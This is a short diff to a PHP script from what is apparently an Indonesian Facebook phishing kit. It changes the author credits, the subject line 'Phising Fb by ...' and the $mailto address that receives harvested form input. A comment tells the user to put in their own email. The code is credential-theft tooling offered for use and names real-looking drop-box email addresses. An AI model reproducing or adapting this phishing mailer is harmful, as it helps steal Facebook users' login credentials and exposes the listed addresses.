@@ -1,13 +1,13 @@
 <?php
 ############################################
-##        Author: Abdul aziz                  ##
-##       Mailer: Lomen                    ##
+##        Author: T-Faces                  ##
+##       Mailer: T-Faces                    ##
 ##       Modifer: scriptpesing.blogspot.com  ##
 ############################################
 /* JANGAN GANTI COPYRIGHT NYA YA SAYANG */
 
-$subjek = 'Phising Fb by Scriptpesing.blogspot.com';
-$mailto = 'bocahceplak@gmail.com'; //masukin email lo disini
+$subjek = 'Phising Fb by https://github.com/T-faces';
+$mailto = 'ariagungsatria01@gmail.com'; //masukin email lo disini
 
 /* Fungsi berikut untuk mengambil input field. */
 
